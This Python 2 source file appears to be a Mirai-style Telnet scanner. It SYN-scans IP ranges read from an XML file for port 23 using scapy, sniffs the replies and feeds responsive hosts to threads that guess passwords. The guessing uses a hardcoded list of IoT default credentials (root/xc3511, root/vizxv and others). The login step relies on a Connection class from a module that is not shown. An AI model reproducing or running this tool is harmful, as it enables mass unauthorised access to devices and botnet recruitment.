#!/usr/bin/python
#encoding:utf-8


import heapq
import copy
import time
import threading
from random import choice
import Queue
import socket
import json
import sys
from new_module import *
from scapy.all import *
from collections import deque

try:
    import xml.etree.cElementTree as ET
except ImportError:
    import xml.etree.ElementTree as ET

reload(sys)
sys.setdefaultencoding('utf-8')

class PriorityQueue:
    def __init__(self):
        self._queue = []
        self._index = 0

    def push(self,pair,priority):
        heapq.heappush(self._queue,(-priority,self._index,pair))
        self._index += 1

    def pop(self):
        return heapq.heappop(self._queue)[-1]

#this should be a dict
auth_table = [("user","password",10),("tech","tech",1),("root","Zte521",2),("root","xc3511",2),("root","vizxv",1),("admin","admin",1),("root","admin",1),("root","888888",1),("root","xmhdipc",1),("root","juantech",1),("root","123456",1),("root","54321",1),("support","support",1),("root","",1),("admin","password",1),("root","root",1),("root","root",1),("user","user",1),("admin","admin1234",1),("admin","smcadmin",1),("root","klv123",1),("root","klv1234",1),("root","hi3518",1),("root","jvbzd",1),("root","anko",1),("root","zlxx.",1),("root","system",1)]

auth_queue = PriorityQueue()
for item in auth_table:
    auth_queue.push(item[0:2],item[-1])


queue = Queue.Queue()
queueLocker = threading.Lock()
ipLocker = threading.Lock()
ip_prompt_queue = deque(maxlen = 100)

def ip2num(ip,bigendian = True):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3] & 0xffffffff

def num2ip(num,bigendian = True):
    return '%s.%s.%s.%s' % ((num >> 24) & 0xff , (num >> 16) & 0xff , (num >> 8) & 0xff , num & 0xff)

def read_ip(file_xml):
    ip_map = []

    tree = ET.ElementTree(file=file_xml)
    root = tree.getroot()
    ip_pair = [child.text.strip().split('-') for child in root]
    for x in ip_pair:
        ip_map.append(xrange(ip2num(x[0]),ip2num(x[1])))
#    return [num2ip(item) for pair in ip_map[0:10] for item in pair] 
    return ip_map

def choose_ip(ip_pair):
    if len(ip_pair) > 0:
        return choice(ip_pair)
    else:
        return None

def controlP():
    '''Init threads'''
    scanner_list = []
    
    spewer_thread = spewer("ip.xml")
    try:
       spewer_thread.daemon = True
       spewer_thread.start()
    except:
       print "[Error] Start spewer faild!"
       sys.exit()
             
    sniffer_thread = sniffer()
    try:
        sniffer_thread.daemon = True
        sniffer_thread.start()
    except:
       print "[Error] Start sniffer faild!"
       sys.exit()

    time.sleep(3)
    for i in range(int(sys.argv[1])):
        t = Scanner()
        try:
            t.daemon = True
            t.start()
        except:
            pass
        scanner_list.append(t)

    while not queue.empty():
        pass

    exitFlag = 1

    spewer_thread.join()
    for t in scanner_list:
        t.join()
    print "scanner finishs..."

def cook(pkt):
    try:
        if pkt[TCP].flags == 18 and pkt[IP].src not in ip_prompt_queue:
            queue.put(pkt[IP].src)
            print pkt[IP].src
            #print pkt[IP].dst
            ip_prompt_queue.append(pkt[IP].src)
    except:
        pass

class sniffer(threading.Thread):
    '''receive sport=22 package'''
    def __init_(self):
        threading.Thread.__init__(self)

    def run(self):
        print "Start to sniffing..."
        sniff(filter="tcp and dst port 2222 and src port 23",prn=cook)


class spewer(threading.Thread):
    '''send dport=22 package'''
    def __init__(self,filename):
        threading.Thread.__init__(self)
        self.ip_pair = read_ip(filename)

    def run(self):
        print "Start to spewing..."
        pkt = IP()/TCP(sport=2222,dport=[23],flags="S")
        for pair in self.ip_pair:
            for ip in pair:
                pkt[IP].dst = num2ip(ip)
                try:
                    send(pkt,verbose=0)
                except:
                    pass

class Scanner(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        print "Starting scanner threading..."
        is_end = 0
        while True:
            ip_port = None
            queueLocker.acquire()
            if self.queue.empty():
                queueLocker.release()
                if is_end > 10:
                    break
                else:
                    is_end = is_end + 1
                time.sleep(3)
                continue
            try:
                ip_port = self.queue.get(block=False)
                #print "one IP gets\n"
            except:
                pass
            queueLocker.release()
            if ip_port: 
                #print "[scanner] Try to auth %s" % ip
                pass
            else:
                time.sleep(3)
                continue

            #password guessing
            con = Connection(copy.deepcopy(ip_port),copy.deepcopy(auth_queue))
            while con._state:
                con.run()
            con.exit()
            del con
                
if __name__ == "__main__": 
    if len(sys.argv) != 2:
        print "usage: scanner.py thread_number"
        print "example: scanner.py 20"
        sys.exit(1)
    controlP()
